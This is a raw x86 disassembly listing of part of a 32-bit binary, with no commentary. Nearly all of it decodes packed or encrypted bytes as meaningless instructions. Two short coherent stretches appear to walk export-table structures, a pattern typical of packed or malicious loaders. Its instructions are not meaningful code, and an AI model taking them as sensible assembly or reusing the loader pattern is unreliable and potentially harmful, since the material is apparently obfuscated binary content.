  40ad4b:	xor    ebp,DWORD PTR [eax-0x7e]
  40ad4e:	pop    es
  40ad4f:	and    al,BYTE PTR [eax-0x6a]
  40ad52:	js     0x40ad3a
  40ad54:	mov    dh,0x44
  40ad56:	or     ebp,DWORD PTR [ecx+ebp*4-0x6e]
  40ad5a:	sub    al,ah
  40ad5c:	lea    ebx,[ecx]
  40ad5e:	sbb    eax,0x234642d2
  40ad63:	pop    es
  40ad64:	xor    BYTE PTR [ebx+edi*8],bh
  40ad67:	aaa    
  40ad68:	push   ss
  40ad69:	pop    es
  40ad6a:	pop    eax
  40ad6b:	ret    0x2fdb
  40ad6e:	jb     0x40ad72
  40ad70:	in     eax,dx
  40ad71:	mov    cl,0x78
  40ad73:	lock dec ebx
  40ad75:	cmp    BYTE PTR ds:[ebx-0x4c00827f],al
  40ad7c:	dec    esp
  40ad7d:	jg     0x40ad2d
  40ad7f:	(bad)  
  40ad81:	dec    eax
  40ad82:	out    dx,al
  40ad83:	sti    
  40ad84:	mov    ebp,0xfec0f6cf
  40ad89:	leave  
  40ad8a:	sbb    BYTE PTR [esi+0x3bc50652],dl
  40ad90:	mov    ds:0x26791af9,eax
  40ad95:	and    cl,dl
  40ad97:	jmp    0x40adc9
  40ad99:	push   ebp
  40ad9a:	mov    ch,0xfa
  40ad9c:	jnp    0x40ada4
  40ad9e:	repnz fwait
  40ada0:	sub    cl,ch
  40ada2:	in     eax,0xab
  40ada4:	in     al,0xfd
  40ada6:	mov    ecx,0x990913f5
  40adab:	jnp    0x40adee
  40adad:	mov    gs,WORD PTR [ecx+edi*8-0x66]
  40adb1:	nop
  40adb2:	adc    DWORD PTR [ecx-0x75e0829e],edi
  40adb8:	mov    ebx,0x8bfb17bf
  40adbd:	popf   
  40adbe:	mov    cl,0x43
  40adc0:	out    dx,eax
  40adc1:	mov    WORD PTR [esi+0x34121e78],?
  40adc7:	daa    
  40adc8:	(bad)  
  40adc9:	or     di,WORD PTR [ebp+0x56]
  40adcd:	enter  0x8230,0xa8
  40add1:	inc    ebp
  40add2:	ja     0x40ad71
  40add4:	loope  0x40ad9d
  40add6:	cli    
  40add7:	mov    esp,0x911cc9e8
  40addc:	aaa    
  40addd:	call   0x7e87a7e2
  40ade2:	sub    bh,dl
  40ade4:	hlt    
  40ade5:	or     BYTE PTR [ebx-0x3ff9825b],0x4d
  40adec:	sub    eax,0x36ad93b7
  40adf1:	int    0xf0
  40adf3:	push   edi
  40adf4:	push   0x46dcd3ab
  40adf9:	mov    dl,0xee
  40adfb:	dec    edi
  40adfc:	addr16 inc ebp
  40adfe:	popa   
  40adff:	pop    es
  40ae00:	add    BYTE PTR [eax-0x5],bh
  40ae03:	lods   al,BYTE PTR ds:[esi]
  40ae04:	xlat   BYTE PTR ds:[ebx]
  40ae05:	popf   
  40ae06:	into   
  40ae07:	mov    eax,ds:0x6847ca5f
  40ae0c:	mov    WORD PTR [edi+eiz*2],?
  40ae0f:	mov    ss,WORD PTR [eax+0x6dfda032]
  40ae15:	scas   al,BYTE PTR es:[edi]
  40ae16:	fisttp QWORD PTR [ecx+esi*8]
  40ae19:	test   bl,ah
  40ae1b:	push   eax
  40ae1c:	push   ds
  40ae1d:	in     al,dx
  40ae1e:	sub    BYTE PTR [eax+0x2],ch
  40ae21:	mov    ecx,esi
  40ae23:	push   ebx
  40ae24:	repnz or ch,BYTE PTR [ebx+0x3b7e1ea1]
  40ae2b:	xchg   ebx,eax
  40ae2c:	in     al,dx
  40ae2d:	push   esi
  40ae2e:	addr16 test esp,0x11a80b0a
  40ae35:	retf   
  40ae36:	cmc    
  40ae37:	(bad)  
  40ae38:	in     eax,0x16
  40ae3a:	mov    eax,0x3560222a
  40ae3f:	xor    DWORD PTR [ebx+0x389039ca],edi
  40ae45:	mov    eax,0x208122e5
  40ae4a:	fild   WORD PTR [edi*1-0x7e9c54ba]
  40ae51:	in     al,dx
  40ae52:	adc    bl,BYTE PTR [ebx+ecx*8-0x7965faa4]
  40ae59:	mov    ah,0x71
  40ae5b:	in     al,dx
  40ae5c:	sbb    BYTE PTR [eax],ah
  40ae5e:	mov    ecx,0xdfe80e7f
  40ae63:	into   
  40ae64:	loopne 0x40aeae
  40ae66:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40ae68:	push   ebp
  40ae69:	out    dx,eax
  40ae6a:	scas   eax,DWORD PTR es:[edi]
  40ae6b:	test   DWORD PTR [ebp-0x60],edi
  40ae6e:	sbb    eax,0x11ae4cbf
  40ae73:	psrld  mm6,QWORD PTR [ebx-0x2f]
  40ae77:	xchg   ebp,eax
  40ae78:	ret    0x5e9a
  40ae7b:	retf   0x83d7
  40ae7e:	fmulp  st(3),st
  40ae80:	xchg   esp,eax
  40ae81:	(bad)  
  40ae82:	ror    DWORD PTR [edx-0x6a],1
  40ae85:	or     al,0xb7
  40ae87:	call   0xd3ce31c9
  40ae8c:	mov    ebx,0xd63cd583
  40ae91:	rcl    ch,cl
  40ae93:	lds    eax,FWORD PTR [ebp-0x6e24e6e4]
  40ae99:	bound  ebp,QWORD PTR [eax+ecx*8+0x20285a52]
  40aea0:	lods   al,BYTE PTR ds:[esi]
  40aea1:	frstor [esi]
  40aea3:	cmp    DWORD PTR [ecx+esi*1-0x7b],ebp
  40aea7:	xchg   ecx,eax
  40aea8:	or     eax,0xae5254cd
  40aead:	out    0xeb,al
  40aeaf:	jmp    0xfe8ee242
  40aeb4:	mov    ebp,0xbe31b876
  40aeb9:	data16 or bh,dl
  40aebc:	je     0x40ae5d
  40aebe:	sbb    eax,0xa69adcd1
  40aec3:	in     eax,dx
  40aec4:	enterw 0x38b3,0x7
  40aec9:	mov    ecx,0xd4456aa4
  40aece:	sbb    ah,BYTE PTR [ecx-0x76]
  40aed1:	mov    DWORD PTR [edi],edi
  40aed3:	fild   QWORD PTR [esi]
  40aed5:	stos   DWORD PTR es:[edi],eax
  40aed6:	xor    ah,BYTE PTR [ebp+0x1ac06033]
  40aedc:	or     ecx,ecx
  40aede:	out    0x41,al
  40aee0:	jmp    0x40af3a
  40aee2:	pop    ss
  40aee3:	cmp    edx,ebp
  40aee5:	out    0xc1,eax
  40aee7:	or     ah,dh
  40aee9:	arpl   dx,sp
  40aeeb:	mov    ds:0xfcccac8a,al
  40aef0:	mov    cs,WORD PTR [ebx]
  40aef2:	movq   QWORD PTR [edx],mm0
  40aef5:	push   es
  40aef6:	cmp    DWORD PTR [edx-0x407cad48],ebx
  40aefc:	jl     0x40aeac
  40aefe:	in     eax,0xd3
  40af00:	dec    ebp
  40af01:	adc    eax,0xe2362d15
  40af06:	retf   0x8702
  40af09:	iret   
  40af0a:	lea    esp,ds:0xadf04932
  40af10:	sti    
  40af11:	stos   BYTE PTR es:[edi],al
  40af12:	out    dx,al
  40af13:	(bad)  
  40af14:	aam    0x95
  40af16:	pop    edx
  40af17:	adc    eax,DWORD PTR [esi+0x48bff60d]
  40af1d:	mov    BYTE PTR [edx+0x1f],bl
  40af20:	mov    al,ds:0xa83dc134
  40af25:	add    BYTE PTR [ebp-0x1],ah
  40af28:	hlt    
  40af29:	ret    0xb432
  40af2c:	pop    edi
  40af2d:	jnp    0x40aeca
  40af2f:	retf   0xca09
  40af32:	or     al,0xae
  40af34:	pushf  
  40af35:	xor    BYTE PTR [ebp-0x43321a8c],bl
  40af3b:	cmp    DWORD PTR [ebp-0xd],ebx
  40af3e:	jae    0x40aef3
  40af40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af41:	inc    edx
  40af42:	loope  0x40afc0
  40af44:	mov    edi,ebx
  40af46:	xchg   bh,bl
  40af48:	sbb    eax,0xebe631bc
  40af4d:	dec    edi
  40af4e:	stc    
  40af4f:	pusha  
  40af50:	jg     0x40aed7
  40af52:	jne    0x40af8a
  40af54:	inc    edx
  40af56:	push   cs
  40af57:	sahf   
  40af58:	cs push ds
  40af5a:	mov    BYTE PTR [edx],al
  40af5c:	fidivr WORD PTR [ecx]
  40af5e:	in     al,dx
  40af5f:	pop    edx
  40af60:	out    dx,eax
  40af61:	xchg   BYTE PTR [ecx+0x55],dl
  40af64:	cdq    
  40af65:	fsubp  st(3),st
  40af67:	push   ecx
  40af68:	xchg   ebp,eax
  40af69:	jae    0x40af80
  40af6b:	xor    eax,0xdd1636d8
  40af70:	mov    eax,0x8118408b
  40af75:	leave  
  40af76:	sbb    BYTE PTR [eax+0x0],dh
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x433827
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x4337df
  40af93:	sub    DWORD PTR ds:0x43378f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x4337db,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x4337db
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x4337db,ecx
  40afb8:	cmp    DWORD PTR ds:0x4337db,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x4337db,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x4337db,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x4337db
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x4337db,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x433827,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	test   esi,edi
  40b019:	pop    ds
  40b01a:	mov    ds:0x7e7ef764,al
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	mov    WORD PTR ds:0xe66126be,gs
  40b029:	loopne 0x40afc5
  40b02b:	ficom  WORD PTR [edx-0x15]
  40b02e:	icebp  
  40b02f:	out    0xbc,al
  40b031:	xor    eax,0x70033212
  40b036:	xor    eax,0xe7468c9e
  40b03b:	fwait
  40b03c:	or     eax,0xfa2dcbb3
  40b041:	pusha  
  40b042:	es mov esp,0x2956a188
  40b048:	retf   0x8f17
  40b04b:	data16 sub cl,0x35
  40b04f:	pop    esi
  40b050:	cmp    dl,ch
  40b052:	mov    es,WORD PTR [edx+0x2a81715]
  40b058:	repz inc ecx
  40b05a:	lea    edx,[esi+0x539f7e23]
  40b060:	add    dl,cl
  40b062:	es jle 0x40b010
  40b065:	enter  0x60e5,0xc
  40b069:	hlt    
  40b06a:	in     al,0xbd
  40b06c:	jmp    0xcfb8:0x7f709b8c
  40b073:	rcl    cl,1
  40b075:	dec    esi
  40b076:	mov    eax,0xb91528f
  40b07b:	shl    ebx,0xc2
  40b07e:	daa    
  40b07f:	add    bl,ah
  40b081:	sub    BYTE PTR [edx-0x3],bl
  40b084:	lds    ecx,FWORD PTR [esi]
  40b086:	aam    0xd
  40b088:	sub    bl,BYTE PTR [edx+ecx*1-0x5b]
  40b08c:	fmul   DWORD PTR [edx]
  40b08e:	in     al,dx
  40b08f:	gs ret 
  40b091:	sub    edi,DWORD PTR [ebp-0x4a]
  40b094:	pop    edx
  40b095:	arpl   WORD PTR ds:0x6c27313b,bp
  40b09b:	pop    ebx
  40b09c:	out    dx,eax
  40b09d:	lods   eax,DWORD PTR ds:[esi]
  40b09e:	ror    DWORD PTR [ecx-0x1d],1
  40b0a1:	shr    BYTE PTR [esi],1
  40b0a3:	xchg   esi,eax
  40b0a4:	pop    es
  40b0a5:	pop    edi
  40b0a6:	pusha  
  40b0a7:	setg   bh
  40b0aa:	add    al,BYTE PTR [ebp+0xb5cae66]
  40b0b0:	mov    BYTE PTR [eax+0x45],dl
  40b0b3:	sahf   
  40b0b4:	daa    
  40b0b5:	leave  
  40b0b6:	addr16 cwde 
  40b0b8:	retf   0xa580
  40b0bb:	neg    BYTE PTR [ecx]
  40b0bd:	adc    eax,0x9489856b
  40b0c2:	mov    al,ds:0xa590f549
  40b0c7:	and    ecx,DWORD PTR [ecx+0xa6f5e74]
  40b0cd:	and    esi,esi
  40b0cf:	dec    esi
  40b0d0:	rcr    BYTE PTR [esi],0x93
  40b0d3:	retf   
  40b0d4:	push   cs
  40b0d5:	push   cs
  40b0d6:	mov    dh,0xc
  40b0d8:	xor    al,0xf
  40b0da:	cli    
  40b0db:	add    eax,0xb310baab
  40b0e0:	fild   QWORD PTR [edx]
  40b0e2:	pop    esp
  40b0e3:	neg    BYTE PTR [eax+0x6e]
  40b0e6:	jne    0x40b157
  40b0e8:	or     al,0x4b
  40b0ea:	repz je 0x40b0b8
  40b0ed:	jmp    0x40b0c2
  40b0ef:	aam    0x3
  40b0f1:	pop    es
  40b0f2:	mov    ds:0x6d565d87,eax
  40b0f7:	lahf   
  40b0f8:	int    0x25
  40b0fa:	pcmpeqw mm2,QWORD PTR [ecx]
  40b0fd:	mov    bl,0xeb
  40b0ff:	inc    ecx
  40b100:	popa   
  40b101:	clc    
  40b102:	in     al,0x8
  40b104:	pushf  
  40b105:	or     edi,DWORD PTR [edi-0x48]
  40b108:	adc    bl,BYTE PTR [ecx+0x24]
  40b10b:	in     al,dx
  40b10c:	inc    ebp
  40b10d:	and    al,0x5d
  40b10f:	mov    dh,0x4f
  40b111:	pusha  
  40b112:	jmp    0x14a2533f
  40b117:	(bad)  
  40b118:	xor    ecx,edx
  40b11a:	sti    
  40b11b:	and    eax,0x1cbb5afb
  40b120:	sti    
  40b121:	pop    ss
  40b122:	in     al,0x8d
  40b124:	inc    esi
  40b125:	xlat   BYTE PTR ds:[ebx]
  40b126:	aad    0xfe
  40b128:	inc    ecx
  40b129:	idiv   ebx
  40b12b:	daa    
  40b12c:	mov    dl,0x5
  40b12e:	dec    esp
  40b12f:	popf   
  40b130:	inc    edi
  40b131:	cld    
  40b132:	or     al,0x3
  40b134:	pop    ebx
  40b135:	dec    edi
  40b136:	xchg   ebx,eax
  40b137:	cwde   
  40b138:	pop    esi
  40b139:	test   eax,0xa27aa2f6
  40b13e:	cmp    bh,BYTE PTR [eax-0xa]
  40b141:	xor    al,0x7a
  40b143:	ds pop ds
  40b145:	push   es
  40b146:	fdivr  QWORD PTR [ebp-0x16]
  40b149:	repnz sbb eax,0x48d2cda9
  40b14f:	cmp    esi,ebx
  40b151:	dec    ebx
  40b152:	daa    
  40b153:	cmp    al,0xb8
  40b155:	sbb    al,0x9c
  40b157:	xchg   ebx,eax
  40b158:	out    dx,al
  40b159:	fdiv   DWORD PTR [edx+0x601c03dc]
  40b15f:	outs   dx,BYTE PTR ds:[esi]
  40b160:	das    
  40b161:	mov    dl,0xd8
  40b163:	push   esp
  40b164:	sahf   
  40b165:	jae    0x40b18b
  40b167:	sub    BYTE PTR [edi-0x46],cl
  40b16a:	out    dx,al
  40b16b:	and    BYTE PTR [ebx],ah
  40b16d:	mov    ebp,0x991c1c2d
  40b172:	cwde   
  40b173:	xor    dh,BYTE PTR [ebx]
  40b175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b176:	mov    eax,0xe32d5cf6
  40b17b:	adc    al,0x84
  40b17d:	fadd   DWORD PTR [eax]
  40b17f:	push   0x7e9f0519
  40b184:	repz call 0x3d8e363f
  40b18a:	inc    ebp
  40b18b:	bound  ebx,QWORD PTR [esi-0x3e]
  40b18e:	aaa    
  40b18f:	lea    ebx,[edx]
  40b191:	sbb    al,0x26
  40b193:	loopne 0x40b120
  40b195:	sub    DWORD PTR [ecx+0x6f],ebp
  40b198:	or     al,0xee
  40b19a:	jns    0x40b159
  40b19c:	ret    
  40b19d:	mov    ds:0xfb850916,al
  40b1a2:	mov    edi,0xeef73233
  40b1a7:	push   ds
  40b1a8:	sti    
  40b1a9:	push   0x18ca3f93
  40b1ae:	(bad)  
  40b1af:	into   
  40b1b0:	mov    eax,DWORD PTR [edi+0x63]
  40b1b3:	xor    ebp,DWORD PTR [edx]
  40b1b5:	test   al,0x59
  40b1b7:	(bad)  
  40b1b9:	inc    esi
  40b1ba:	neg    DWORD PTR [ebp-0x2]
  40b1bd:	xchg   edi,eax
  40b1be:	jns    0x40b18a
  40b1c0:	fwait
  40b1c1:	push   ecx
  40b1c2:	mov    ds:0x42f6b30f,al
  40b1c7:	push   cs
  40b1c8:	sub    eax,DWORD PTR [esi-0x20]
  40b1cb:	mov    ebp,0xc1d8cd91
  40b1d0:	xor    edx,0x5e
  40b1d3:	cdq    
  40b1d4:	clc    
  40b1d5:	lds    esi,FWORD PTR [ebx-0x1f]
  40b1d8:	ja     0x40b171
  40b1da:	out    0x64,eax
  40b1dc:	pop    ebx
  40b1dd:	xor    al,0xf8
  40b1df:	pop    esp
  40b1e0:	jge    0x40b166
  40b1e2:	imul   ebx,DWORD PTR [ebp+0x7d],0xffffffce
  40b1e6:	inc    ebp
  40b1e7:	mov    cl,0x39
  40b1e9:	ds sub DWORD PTR cs:[ebp-0x64],edx
  40b1ee:	adc    eax,0xad26a202
  40b1f3:	cs mov bl,0xa6
  40b1f6:	pop    edi
  40b1f7:	mov    WORD PTR [eax-0x24cdc9b3],gs
  40b1fd:	cmc    
  40b1fe:	pop    DWORD PTR [edi-0x4f]
  40b201:	adc    esi,esp
  40b203:	or     al,0x2b
  40b205:	add    al,0xe9
  40b207:	fwait
  40b208:	pop    edx
  40b209:	pushf  
  40b20a:	aas    
  40b20b:	adc    al,0x6c
  40b20d:	cmp    ah,BYTE PTR [edi]
  40b20f:	push   edi
  40b210:	dec    edi
  40b211:	add    DWORD PTR [edi+0x2c],edx
  40b214:	out    dx,eax
  40b215:	pop    edi
  40b216:	in     al,0x42
  40b218:	inc    edi
  40b219:	loopne 0x40b275
  40b21b:	sbb    al,0xed
  40b21d:	mov    edx,0x71fe8680
  40b222:	lgs    edx,FWORD PTR [ebp-0x64]
  40b226:	outs   dx,DWORD PTR ds:[esi]
  40b227:	imul   edi,ebx,0x2b561183
  40b22d:	push   eax
  40b22e:	jo     0x40b23f
  40b230:	icebp  
  40b231:	jmp    0x40b1b9
  40b233:	ds sbb bh,ah
  40b236:	out    0x13,eax
  40b238:	fidivr DWORD PTR [eax]
  40b23a:	arpl   WORD PTR [eax-0x6169246c],bx
  40b240:	idiv   esi
  40b242:	jne    0x40b257
  40b244:	sub    BYTE PTR [edi+ebx*8],dl
  40b247:	push   ebp
  40b248:	xchg   esi,eax
  40b249:	outs   dx,BYTE PTR ds:[esi]
  40b24a:	jp     0x40b241
  40b24c:	je     0x40b1fe
  40b24e:	cli    
  40b24f:	cmp    BYTE PTR [ecx-0x9],dl
  40b252:	fidivr DWORD PTR [edx+0x69]
  40b255:	into   
  40b256:	retf   
  40b257:	xchg   edx,eax
  40b258:	idiv   DWORD PTR [edx+0x7f]
  40b25b:	push   cs
  40b25c:	push   eax
  40b25d:	add    ebx,DWORD PTR [edx]
  40b25f:	dec    eax
  40b260:	mov    ds:0x924516bd,eax
  40b265:	dec    esp
  40b266:	mov    ch,ch
  40b268:	les    ecx,FWORD PTR [ebx+0x4d8bec45]
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	jne    0x40b2b4
  40b285:	lahf   
  40b286:	out    0x2e,eax
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	ret    0xd201
  40b292:	cli    
  40b293:	push   ds
  40b294:	push   ss
  40b295:	dec    ebp
  40b296:	cmc    
  40b297:	ret    0x717f
  40b29a:	mov    DWORD PTR [esi+edi*1+0x30],ecx
  40b29e:	fiadd  DWORD PTR [ebx]
  40b2a0:	lods   al,BYTE PTR ds:[esi]
  40b2a1:	es popaw 
  40b2a4:	sbb    al,0xc3
  40b2a6:	stos   DWORD PTR es:[edi],eax
  40b2a7:	test   al,0xef
  40b2a9:	sub    al,0xfc
  40b2ab:	lea    eax,[ebp+0x2c2b0aeb]
  40b2b1:	loope  0x40b319
  40b2b3:	mov    ah,0x58
  40b2b5:	cmp    esp,DWORD PTR ds:0x17eb6475
  40b2bb:	mov    ecx,0x7c3df8c0
  40b2c0:	sti    
  40b2c1:	jmp    0x7283:0xe56644e8
  40b2c8:	retf   0x5b95
  40b2cb:	add    ch,bl
  40b2cd:	adc    BYTE PTR [ebp-0x3d],0x86
  40b2d1:	and    ecx,DWORD PTR ds:0xe066b534
  40b2d7:	push   0x54
  40b2d9:	xlat   BYTE PTR ds:[ebx]
  40b2da:	xor    al,0xc7
  40b2dc:	test   eax,0x6b224e40
  40b2e1:	mov    ds:0x4bcd10b8,eax
  40b2e6:	enter  0xab7,0x7c
  40b2ea:	stc    
  40b2eb:	push   cs
  40b2ec:	and    DWORD PTR [esi-0x2367676a],0xbaed1c31
  40b2f6:	and    BYTE PTR [esi+ebp*8],dh
  40b2f9:	xor    DWORD PTR [edi+0x21],ebp
  40b2fc:	pop    ebx
  40b2fd:	push   cs
  40b2fe:	add    BYTE PTR [edx],cl
  40b300:	jbe    0x40b365
  40b302:	test   al,0x1a
  40b304:	xchg   ebp,eax
  40b305:	rol    BYTE PTR [ebp+0x37],1
  40b308:	in     al,0x4d
  40b30a:	add    eax,0x8796fb51
  40b30f:	lahf   
  40b310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b311:	aam    0x5c
  40b313:	sbb    BYTE PTR [esi-0x3b],al
  40b316:	pop    edi
  40b317:	int    0x5d
  40b319:	dec    ebp
  40b31a:	and    BYTE PTR [esi+0x4f],0x51
  40b31e:	daa    
  40b31f:	sub    edi,eax
  40b321:	push   edx
  40b322:	loope  0x40b2e4
  40b324:	xor    eax,0xe54ac5b9
  40b329:	jnp    0x40b3a6
  40b32b:	loope  0x40b2c2
  40b32d:	icebp  
  40b32e:	or     al,BYTE PTR [eax-0x51]
  40b331:	je     0x40b2bc
  40b333:	xchg   esp,eax
  40b334:	adc    edx,DWORD PTR [edi-0x74]
  40b337:	add    al,0xd7
  40b339:	dec    esi
  40b33a:	xchg   ebp,eax
  40b33b:	xor    al,0x4d
  40b33d:	jp     0x5fee4bb2
  40b343:	jle    0x40b30c
  40b345:	mov    edi,DWORD PTR [esi-0x1764bc26]
  40b34b:	jp     0x40b384
  40b34d:	inc    edx
  40b34e:	add    BYTE PTR [ebx-0x44],ch
  40b351:	lods   al,BYTE PTR ds:[esi]
  40b352:	mov    cl,0xfa
  40b354:	cmc    
  40b355:	stos   BYTE PTR es:[edi],al
  40b356:	jnp    0x40b382
  40b358:	(bad)
  40b35b:	sbb    dl,al
  40b35d:	sub    BYTE PTR [edi+0x76],al
  40b360:	loop   0x40b379
  40b362:	and    ch,cl
  40b364:	xchg   ebp,eax
  40b365:	sahf   
  40b366:	fisub  WORD PTR [esi-0x45f47531]
  40b36c:	inc    ecx
  40b36d:	retf   0xe046
  40b370:	pusha  
  40b371:	xor    BYTE PTR [edx-0x774d96f5],dl
  40b377:	xchg   edx,eax
  40b378:	xchg   esp,eax
  40b379:	pop    ds
  40b37a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b37b:	dec    esi
  40b37c:	mov    DWORD PTR [edx-0x2b997570],esp
  40b382:	rol    BYTE PTR [esi+eiz*4+0x21],cl
  40b386:	sub    al,BYTE PTR [ecx-0x5adf52db]
  40b38c:	nop
  40b38d:	repnz (bad) 
  40b38f:	dec    ebp
  40b390:	push   ds
  40b391:	sub    eax,0x942f3de7
  40b396:	add    dl,0x3d
  40b399:	cmp    eax,0x7cc68a96
  40b39e:	ret    0x1a39
  40b3a1:	cmc    
  40b3a2:	sub    BYTE PTR [edi-0x6a2fcd1e],cl
  40b3a8:	pop    ebx
  40b3a9:	xchg   edx,eax
  40b3aa:	stos   BYTE PTR es:[edi],al
  40b3ab:	aad    0x2e
  40b3ad:	adc    esi,ebx
  40b3af:	scas   eax,DWORD PTR es:[edi]
  40b3b0:	xchg   esi,eax
  40b3b1:	xchg   ecx,eax
  40b3b2:	sbb    bp,dx
  40b3b5:	jle    0x40b365
  40b3b7:	add    ecx,DWORD PTR [edi+0x16]
  40b3ba:	loopne 0x40b34b
  40b3bc:	jp     0x40b3b5
  40b3be:	xchg   edx,eax
  40b3bf:	jbe    0x40b3b6
  40b3c1:	mov    edi,0x6c1363f6
  40b3c6:	imul   ebp,eax,0x6eef3def
  40b3cc:	mov    gs,WORD PTR [ebp+0x2bdfc892]
  40b3d2:	cmp    al,0x5b
  40b3d4:	pop    ebx
  40b3d5:	mov    ecx,0xc65ebb4c
  40b3da:	and    BYTE PTR [ecx+0x1cc78d08],al
  40b3e0:	(bad)  
  40b3e1:	cmp    esp,DWORD PTR [eax]
  40b3e3:	outs   dx,BYTE PTR ds:[esi]
  40b3e4:	cmp    esi,0xae95aa90
  40b3ea:	vfnmsub231sd xmm7,xmm6,QWORD PTR [edx-0x7a7e31b6]
  40b3f3:	stos   DWORD PTR es:[edi],eax
  40b3f4:	sub    eax,0xa964e4c2
  40b3f9:	dec    eax
  40b3fa:	daa    
  40b3fb:	pop    eax
  40b3fc:	imul   ecx,DWORD PTR [esi],0x564c63c8
  40b402:	push   edi
  40b403:	outs   dx,DWORD PTR ds:[esi]
  40b404:	adc    BYTE PTR [edx-0x42],ah
  40b407:	sbb    al,0xe4
  40b409:	mov    ecx,edi
  40b40b:	shl    DWORD PTR [edi+0x72],1
  40b40e:	xchg   ecx,eax
  40b40f:	mov    ds:0xa5d521b9,eax
  40b414:	push   esp
  40b415:	movlps QWORD PTR [ecx-0x41874],xmm3
  40b41c:	xor    eax,0x6d92728c
  40b421:	or     eax,0x527d2a91
  40b426:	mov    ?,WORD PTR [eax+0x2]
  40b429:	mov    edi,edx
  40b42b:	(bad)  
  40b42c:	les    eax,FWORD PTR [ebx-0x1c3bd402]
  40b432:	jge    0x40b3f8
  40b434:	fdivp  st(0),st
  40b436:	xor    DWORD PTR [ecx+0x143d4a41],0x2c
  40b43d:	pop    ebx
  40b43e:	or     bl,BYTE PTR ds:0x1d1fea0c
  40b444:	or     eax,0xdf9dc31
  40b44a:	adc    ch,BYTE PTR [edi-0x36]
  40b44d:	mov    esi,0xb4f33543
  40b452:	pusha  
  40b453:	push   ds
  40b454:	dec    eax
  40b455:	ins    BYTE PTR es:[edi],dx
  40b456:	push   ds
  40b457:	mov    BYTE PTR [edx],ah
  40b459:	in     al,dx
  40b45a:	jmp    0x754b:0x4585c48a
  40b461:	push   esp
  40b462:	in     al,dx
  40b463:	in     al,dx
  40b464:	push   ss
  40b465:	jmp    0x40b44b
  40b467:	(bad)
  40b46a:	push   0xffffffe1
  40b46c:	adc    BYTE PTR [ebp-0x75b86c65],ah
  40b472:	test   eax,0x76fa7cc1
  40b477:	mov    cs,WORD PTR [eax+0x4e]
  40b47a:	popa   
  40b47b:	out    0xa0,al
  40b47d:	out    dx,eax
  40b47e:	iret   
  40b47f:	push   ss
  40b480:	mov    ch,BYTE PTR [edx+0x2ed5897a]
  40b486:	add    eax,0x27db39cc
  40b48b:	mov    ds:0xe0c06231,al
  40b490:	repnz fdiv st(4),st
  40b493:	loop   0x40b446
  40b495:	aas    
  40b496:	xchg   edx,eax
  40b497:	std    
  40b498:	mov    esp,0x2c3b44cd
  40b49d:	ret    
  40b49e:	dec    esp
  40b49f:	fistp  QWORD PTR [ebp+0x96c3187]
  40b4a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4a6:	leave  
  40b4a7:	das    
  40b4a8:	mov    dl,0x41
  40b4aa:	adc    esi,DWORD PTR [ebp-0x52]
  40b4ad:	or     BYTE PTR [edx],bh
  40b4af:	lea    ebx,[edi-0x1aecbb1c]
  40b4b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4b6:	or     eax,edx
  40b4b8:	push   edx
  40b4b9:	push   0x6de46d9d
  40b4be:	stos   DWORD PTR es:[edi],eax
  40b4bf:	ftst   
  40b4c1:	dec    ecx
  40b4c2:	push   edx
  40b4c3:	dec    edx
  40b4c4:	push   edi
  40b4c5:	jne    0x40b496
  40b4c7:	push   es
  40b4c8:	clc    
  40b4c9:	lahf   
  40b4ca:	sub    cl,BYTE PTR [edi-0x70468410]
  40b4d0:	fistp  DWORD PTR [edx-0x76156b62]
  40b4d6:	dec    ebp
  40b4d7:	aam    0x8b
  40b4d9:	inc    ebp
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	xor    dl,BYTE PTR [ecx-0x24]
  40b50a:	sub    al,0xe8
  40b50c:	lock jle 0x40b58d
